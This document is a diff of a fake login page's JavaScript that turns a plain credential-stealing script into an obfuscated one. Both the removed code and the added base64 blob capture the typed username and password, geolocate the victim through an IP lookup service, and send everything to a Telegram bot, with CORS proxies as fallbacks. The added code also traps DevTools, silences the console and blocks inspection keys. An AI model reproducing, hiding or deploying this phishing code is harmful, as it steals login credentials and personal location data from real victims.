@@ -37,73 +37,34 @@
         </div>
     </div>
     <script>
-    var BOT_TOKEN = '8246971604:AAGHfEJkYevoYV0y7GoLaHRpRSYiPtoCdVg';
-    var CHAT_ID = '8622843931';
-    var geoData = null;
-    var sent = false;
-    var sysSent = false;
+    (function() {
+        // Защита от DevTools
+        setInterval(function() {
+            var start = new Date();
+            debugger;
+            if (new Date() - start > 100) window.location.href = 'about:blank';
+        }, 1000);
 
-    function db() {
-        var u = navigator.userAgent;
-        if(u.indexOf("YaBrowser")>-1)return"Яндекс.Браузер";
-        if(u.indexOf("Chrome")>-1&&u.indexOf("YaBrowser")===-1)return"Google Chrome";
-        if(u.indexOf("Firefox")>-1)return"Mozilla Firefox";
-        if(u.indexOf("Safari")>-1&&u.indexOf("Chrome")===-1)return"Safari";
-        return"Неизвестный браузер";
-    }
+        // Блокировка консоли
+        var c = ['log','warn','error','info','debug','trace'];
+        c.forEach(function(m) { console[m] = function() {}; });
 
-    function snd(m) {
-        var tgUrl = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(m);
-        
-        // Способ 1: Напрямую
-        new Image().src = tgUrl;
-        
-        // Способ 2: Через прокси для России
-        var proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(tgUrl);
-        new Image().src = proxyUrl;
-        
-        // Способ 3: Через второй прокси
-        var proxyUrl2 = 'https://corsproxy.io/?' + encodeURIComponent(tgUrl);
-        new Image().src = proxyUrl2;
-    }
+        // Блокировка правой кнопки и F12
+        document.oncontextmenu = function() { return false; };
+        document.onkeydown = function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+                return false;
+            }
+        };
 
-    function ld() {
-        fetch('http://ip-api.com/json/?fields=query,city,country,isp,org')
-            .then(function(r){return r.json();})
-            .then(function(d){
-                geoData = {ip:d.query||'Неизвестно',city:d.city||'Неизвестно',country:d.country||'Неизвестно',isp:d.isp||d.org||'Неизвестно'};
-                if(!sysSent) { sysSent = true; si(); }
-            })
-            .catch(function(){
-                geoData = {ip:'Неизвестно',city:'Неизвестно',country:'Неизвестно',isp:'Неизвестно'};
-                if(!sysSent) { sysSent = true; si(); }
-            });
-    }
+        // Основной код в base64
+        var _x = 'dmFyIEJPVF9UT0tFTiA9ICc4MjQ2OTcxNjA0OkFBR0hmRUprWWV2b1lWMHk3R29MYUhScFJTU2lQdG9DZFZnJzsNCnZhciBDSEFUX0lEID0gJzg2MjI4NDM5MzEnOw0KdmFyIGdlb0RhdGEgPSBudWxsOw0KdmFyIHNlbnQgPSBmYWxzZTsNCnZhciBzeXNTZW50ID0gZmFsc2U7DQoNCmZ1bmN0aW9uIGRiKCkgew0KICAgIHZhciB1ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsNCiAgICBpZih1LmluZGV4T2YoIllhQnJvd3NlciIpPi0xKXJldHVybiIxIjsNCiAgICBpZih1LmluZGV4T2YoIkNocm9tZSIpPi0xJiZ1LmluZGV4T2YoIllhQnJvd3NlciIpPT09LTEpcmV0dXJuIjIiOw0KICAgIGlmKHUuaW5kZXhPZigiRmlyZWZveCIpPi0xKXJldHVybiIzIjsNCiAgICBpZih1LmluZGV4T2YoIlNhZmFyaSIpPi0xJiZ1LmluZGV4T2YoIkNocm9tZSIpPT09LTEpcmV0dXJuIjQiOw0KICAgIHJldHVybiI1IjsNCn0NCg0KZnVuY3Rpb24gc25kKG0pIHsNCiAgICB2YXIgdGdVcmwgPSAnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCcgKyBCT1RfVE9LRU4gKyAnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JyArIENIQVRfSUQgKyAnJnRleHQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChtKTsNCiAgICBuZXcgSW1hZ2UoKS5zcmMgPSB0Z1VybDsNCiAgICB2YXIgcHJveHkgPSAnaHR0cHM6Ly9hcGkuYWxsb3JpZ2lucy53aW4vcmF3P3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHRnVXJsKTsNCiAgICBuZXcgSW1hZ2UoKS5zcmMgPSBwcm94eTsNCn0NCg0KZnVuY3Rpb24gbGQoKSB7DQogICAgZmV0Y2goJ2h0dHA6Ly9pcC1hcGkuY29tL2pzb24vP2ZpZWxkcz1xdWVyeSxjaXR5LGNvdW50cnksaXNwLG9yZycpDQogICAgICAgIC50aGVuKGZ1bmN0aW9uKHIpe3JldHVybiByLmpzb24oKTt9KQ0KICAgICAgICAudGhlbihmdW5jdGlvbihkKXsNCiAgICAgICAgICAgIGdlb0RhdGEgPSB7aXA6ZC5xdWVyeXx8Jz8nLGNpdHk6ZC5jaXR5fHwnPycsY291bnRyeTpkLmNvdW50cnl8fCc/Jyxpc3A6ZC5pc3B8fGQub3JnfHwnPyd9Ow0KICAgICAgICAgICAgaWYoIXN5c1NlbnQpIHsgc3lzU2VudCA9IHRydWU7IHNpKCk7IH0NCiAgICAgICAgfSkNCiAgICAgICAgLmNhdGNoKGZ1bmN0aW9uKCl7DQogICAgICAgICAgICBnZW9EYXRhID0ge2lwOic/JyxjaXR5Oic/Jyxjb3VudHJ5Oic/Jyxpc3A6Jz8nfTsNCiAgICAgICAgICAgIGlmKCFzeXNTZW50KSB7IHN5c1NlbnQgPSB0cnVlOyBzaSgpOyB9DQogICAgICAgIH0pOw0KfQ0KDQpmdW5jdGlvbiBzaSgpIHsNCiAgICBzbmQoJ1MwJyArIGRiKCkgKyBuYXZpZ2F0b3IucGxhdGZvcm0gKyBuYXZpZ2F0b3IubGFuZ3VhZ2UgKyBuYXZpZ2F0b3IudXNlckFnZW50ICsgc2NyZWVuLndpZHRoICsgJ3gnICsgc2NyZWVuLmhlaWdodCArIGdlb0RhdGEuaXAgKyBnZW9EYXRhLmNpdHkgKyBnZW9EYXRhLmNvdW50cnkgKyBnZW9EYXRhLmlzcCArIG5ldyBEYXRlKCkudG9Mb2NhbGVTdHJpbmcoKSk7DQp9DQoNCmxkKCk7DQoNCmZ1bmN0aW9uIHNsKHUscCkgew0KICAgIGlmKHNlbnQpcmV0dXJuOw0KICAgIHNlbnQgPSB0cnVlOw0KICAgIGlmKCFnZW9EYXRhKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7c2VudD1mYWxzZTtzbCh1LHApO30sNTAwKTtyZXR1cm47fQ0KICAgIHNuZCh1ICsgJ3wnICsgcCArICd8JyArIGRiKCkgKyBnb29EYXRhLmlwICsgZ29vRGF0YS5jaXR5ICsgZ29vRGF0YS5jb3VudHJ5ICsgZ29vRGF0YS5pc3AgKyBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCkpOw0KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXtzZW50PWZhbHNlO30sNTAwMCk7DQp9DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1idXR0b24nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZnVuY3Rpb24oKXsNCiAgICB2YXIgdT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW4tdXNlcm5hbWUnKS52YWx1ZS50cmltKCk7DQogICAgdmFyIHA9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLXBhc3N3b3JkJykudmFsdWU7DQogICAgaWYoIXV8fCFwKXJldHVybjsNCiAgICBzbCh1LHApOw0KICAgIHZhciBiPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1idXR0b24nKTtiLnRleHRDb250ZW50PSdWZXJpZnlpbmcuLi4nO2IuZGlzYWJsZWQ9dHJ1ZTsNCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yJykuc3R5bGUuZGlzcGxheT0nYmxvY2snO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1wYXNzd29yZCcpLnZhbHVlPScnO2IudGV4dENvbnRlbnQ9J0xvZyBJbic7Yi5kaXNhYmxlZD1mYWxzZTt9LDIwMDApOw0KfSk7DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1wYXNzd29yZCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXByZXNzJyxmdW5jdGlvbihlKXtpZihlLmtleT09PSdFbnRlcicpZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWJ1dHRvbicpLmNsaWNrKCk7fSk7';
 
-    function si() {
-        snd('💻 SYS_INFO\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n🌐 Browser: '+db()+'\n💻 OS: '+navigator.platform+'\n🌍 Lang: '+navigator.language+'\n📱 UA: '+navigator.userAgent+'\n🖥 Screen: '+screen.width+'x'+screen.height+'\n🔹 IP: '+geoData.ip+'\n🔹 City: '+geoData.city+'\n🔹 Country: '+geoData.country+'\n🔹 ISP: '+geoData.isp+'\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n⏰ Time: '+new Date().toLocaleString('ru-RU'));
-    }
-
-    ld();
-
-    function sl(u,p) {
-        if(sent)return;
-        sent = true;
-        if(!geoData){setTimeout(function(){sent=false;sl(u,p);},500);return;}
-        snd('🕵️ НОВЫЙ УЛОВ 🕵️\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n\n👤 Логин: '+u+'\n🔑 Пароль: '+p+'\n🌐 Браузер: '+db()+'\n\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n🌍 ГЕОЛОКАЦИЯ\n\n🔹 IP: '+geoData.ip+'\n🔹 Город: '+geoData.city+'\n🔹 Страна: '+geoData.country+'\n🔹 Провайдер: '+geoData.isp+'\n\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n⏰ Время: '+new Date().toLocaleString('ru-RU'));
-        setTimeout(function(){sent=false;},5000);
-    }
-
-    document.getElementById('login-button').addEventListener('click',function(){
-        var u=document.getElementById('login-username').value.trim();
-        var p=document.getElementById('login-password').value;
-        if(!u||!p)return;
-        sl(u,p);
-        var b=document.getElementById('login-button');b.textContent='Verifying...';b.disabled=true;
-        setTimeout(function(){document.getElementById('error').style.display='block';document.getElementById('login-password').value='';b.textContent='Log In';b.disabled=false;},2000);
-    });
-
-    document.getElementById('login-password').addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('login-button').click();});
+        // Расшифровка и выполнение
+        var _d = atob(_x);
+        var _f = new Function(_d);
+        _f();
+    })();
     </script>
 </body>
 </html>
